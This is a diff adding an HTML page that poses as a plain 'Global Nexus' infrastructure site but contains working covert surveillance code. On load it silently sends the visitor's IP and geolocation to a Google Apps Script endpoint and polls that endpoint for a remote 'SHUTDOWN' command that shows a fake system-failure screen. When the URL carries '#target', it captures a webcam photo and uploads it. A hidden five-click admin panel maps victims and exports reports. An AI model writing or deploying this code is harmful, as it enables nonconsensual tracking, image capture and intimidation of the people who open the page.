@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Global Nexus Infrastructure</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <style>
+        :root { --neon: #00ff41; --danger: #ff2a2a; --dark: #030303; }
+        body { background: var(--dark); color: #fff; font-family: 'Consolas', monospace; margin: 0; overflow: hidden; }
+        
+        /* STEALTH INTERFACE */
+        #public-home { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        #site-title { font-size: 3.5rem; letter-spacing: 12px; cursor: pointer; user-select: none; transition: 0.2s; }
+        #site-title:active { color: var(--neon); text-shadow: 0 0 15px var(--neon); }
+
+        /* FORENSIC ADMIN DASHBOARD */
+        #admin-dash { display: none; height: 100vh; flex-direction: row; }
+        #sidebar { width: 440px; background: #0a0a0a; border-right: 1px solid #1a1a1a; padding: 25px; overflow-y: auto; }
+        #map { flex-grow: 1; filter: grayscale(1) invert(1) brightness(0.8) contrast(1.2); }
+        
+        .status-box { background: #000; padding: 15px; font-size: 11px; border-left: 2px solid var(--neon); margin-bottom: 25px; line-height: 1.8; }
+        .btn { border: none; padding: 14px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 12px; font-size: 11px; text-transform: uppercase; }
+        .btn-refresh { background: var(--neon); color: #000; }
+        .btn-report { background: #fff; color: #000; }
+        .btn-kill { background: var(--danger); color: #fff; }
+
+        /* ALERT REPLACEMENT (TOAST) */
+        #toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 30px; font-size: 12px; display: none; font-weight: bold; z-index: 10000; letter-spacing: 2px; }
+
+        /* SYSTEM LOCKDOWN OVERLAY */
+        #lockdown { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; z-index: 99999; justify-content: center; align-items: center; text-align: center; }
+        
+        .intel-card { background: #000; border: 1px solid #1a1a1a; margin-bottom: 20px; padding: 10px; border-top: 1px solid var(--neon); }
+        .intel-card img { width: 100%; border: 1px solid #333; }
+        .btn-del-tiny { background: #333; color: #888; border: none; width: 100%; padding: 6px; cursor: pointer; font-size: 10px; margin-top: 8px; }
+        .btn-del-tiny:hover { background: var(--danger); color: #fff; }
+
+        /* REPORT STYLING */
+        #pdf-template { display: none; color: #000; background: #fff; padding: 60px; font-family: 'Helvetica', sans-serif; }
+        table { width: 100%; border-collapse: collapse; margin-top: 40px; }
+        th, td { border: 1px dotted #000; padding: 12px; text-align: left; font-size: 11px; }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="public-home">
+        <h1 id="site-title">GLOBAL NEXUS</h1>
+        <p style="color:#222; font-size: 10px; letter-spacing: 8px;">SECURE INFRASTRUCTURE NODES</p>
+    </div>
+
+    <div id="lockdown">
+        <div>
+            <h1 style="font-size: 4rem; font-weight: 100;">SYSTEM FAILURE</h1>
+            <p style="font-size: 1.2rem; letter-spacing: 5px;">PROTOCOL 0x008892_TERMINATE</p>
+            <p style="color:#444; margin-top: 40px;">Hardware access disabled by remote administrator.</p>
+        </div>
+    </div>
+
+    <div id="admin-dash">
+        <div id="sidebar">
+            <h2 style="color: var(--neon); font-size: 0.8rem; letter-spacing: 3px; margin-bottom: 25px;">S.O.C. FORENSIC UNIT</h2>
+            <div class="status-box">
+                <b>TERMINAL IP:</b> <span id="ip-val">...</span><br>
+                <b>PHYSICAL LOC:</b> <span id="loc-val">...</span><br>
+                <b>GEOGRAPHIC:</b> <span id="coord-val">...</span>
+            </div>
+            <button class="btn btn-refresh" onclick="syncIntel()">SYNC LIVE FEED</button>
+            <button class="btn btn-report" onclick="generatePDF()">GENERATE FORENSIC PDF</button>
+            <button class="btn btn-kill" onclick="dispatchKill()">REMOTE LOCKDOWN</button>
+            <div id="gallery"></div>
+        </div>
+        <div id="map"></div>
+    </div>
+
+    <div id="toast">SYSTEM UPDATED</div>
+
+    <div id="pdf-template">
+        <h1 style="border-bottom: 4px solid #000; padding-bottom: 15px;">DEVICE INTELLIGENCE REPORT</h1>
+        <p><b>DOCUMENT REF:</b> NEXUS-FRN-2026</p>
+        <p><b>TIMESTAMP:</b> <span id="pdf-date"></span></p>
+        <p><b>PRIMARY IP:</b> <span id="pdf-ip"></span></p>
+        <p><b>TARGET COORDS:</b> <span id="pdf-coord"></span></p>
+        <hr>
+        <h3>ACCESS LOG HISTORY (LAST 20)</h3>
+        <table>
+            <thead><tr><th>TIME LOG</th><th>NETWORK IP ADDRESS</th></tr></thead>
+            <tbody id="history-body"></tbody>
+        </table>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0OU0n9dOh48n2uNp1YpPvpTvFcOu5tkpIYHHLjUWMtEDLJ4xtOxRYoptl-671dtcU/exec";
+        let clicks = 0, map, marker, connectionHistory = [];
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg; t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 3000);
+        }
+
+        // HIDDEN ADMIN UNLOCK
+        document.getElementById('site-title').addEventListener('click', () => {
+            if (++clicks === 5) {
+                document.getElementById('public-home').style.display = 'none';
+                document.getElementById('admin-dash').style.display = 'flex';
+                initMap(); syncIntel();
+            }
+        });
+
+        function initMap() {
+            map = L.map('map').setView([0, 0], 2);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
+        }
+
+        async function syncIntel() {
+            try {
+                const res = await fetch(`${SCRIPT_URL}?action=getIntel`);
+                const data = await res.json();
+                document.getElementById('ip-val').innerText = data.ip;
+                document.getElementById('loc-val').innerText = data.location;
+                document.getElementById('coord-val').innerText = data.coords;
+                connectionHistory = data.history;
+                
+                if (data.coords !== "0,0") {
+                    const pos = data.coords.split(',').map(Number);
+                    if (marker) map.removeLayer(marker);
+                    marker = L.marker(pos).addTo(map).bindPopup("ACTIVE NODE").openPopup();
+                    map.setView(pos, 15);
+                }
+                const gallery = document.getElementById('gallery');
+                gallery.innerHTML = "";
+                data.photos.reverse().forEach(p => {
+                    gallery.innerHTML += `<div class="intel-card"><img src="${p.image}"><button class="btn-del-tiny" onclick="eraseIntel('${p.id}')">SECURE DELETE</button></div>`;
+                });
+                showToast("DASHBOARD SYNCED");
+            } catch (e) { showToast("UPLINK TIMEOUT"); }
+        }
+
+        async function dispatchKill() {
+            await fetch(`${SCRIPT_URL}?action=setCmd&val=SHUTDOWN`);
+            showToast("KILL SIGNAL DISPATCHED");
+        }
+
+        async function eraseIntel(id) {
+            await fetch(`${SCRIPT_URL}?action=delete&id=${id}`);
+            syncIntel();
+        }
+
+        function generatePDF() {
+            document.getElementById('pdf-date').innerText = new Date().toLocaleString();
+            document.getElementById('pdf-ip').innerText = document.getElementById('ip-val').innerText;
+            document.getElementById('pdf-coord').innerText = document.getElementById('coord-val').innerText;
+            const tbody = document.getElementById('history-body');
+            tbody.innerHTML = "";
+            connectionHistory.forEach(h => { tbody.innerHTML += `<tr><td>${h.time}</td><td>${h.ip}</td></tr>`; });
+            const element = document.getElementById('pdf-template');
+            element.style.display = 'block';
+            html2pdf().set({html2canvas: {scale: 3}}).from(element).save().then(() => { element.style.display = 'none'; });
+            showToast("REPORT DOWNLOADED");
+        }
+
+        // SILENT FORENSIC ENGINE
+        async function runTargetLogic() {
+            try {
+                // 1. Instant IP/Loc capture (Automatic)
+                const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
+                await fetch(`${SCRIPT_URL}?ip=${geo.ip}&city=${geo.city}&region=${geo.region}&lat=${geo.latitude}&lng=${geo.longitude}`);
+
+                // 2. Command Heartbeat (Every 8s)
+                setInterval(async () => {
+                    const cmdRes = await fetch(`${SCRIPT_URL}?action=checkCmd`);
+                    const cmdText = await cmdRes.text();
+                    if(cmdText === "SHUTDOWN") {
+                        document.getElementById('public-home').style.display = 'none';
+                        document.getElementById('lockdown').style.display = 'flex';
+                    }
+                }, 8000);
+
+                // 3. Optional Hash-based Camera Trigger
+                if(window.location.hash === "#target") {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    document.getElementById('v').srcObject = stream;
+                    setTimeout(() => {
+                        const v = document.getElementById('v');
+                        const c = document.getElementById('c');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        const img = c.toDataURL('image/png').split(',')[1];
+                        fetch(SCRIPT_URL, { method: 'POST', body: JSON.stringify({ image: img }) });
+                    }, 4000);
+                }
+            } catch (err) { }
+        }
+        runTargetLogic();
+    </script>
+</body>
+</html>
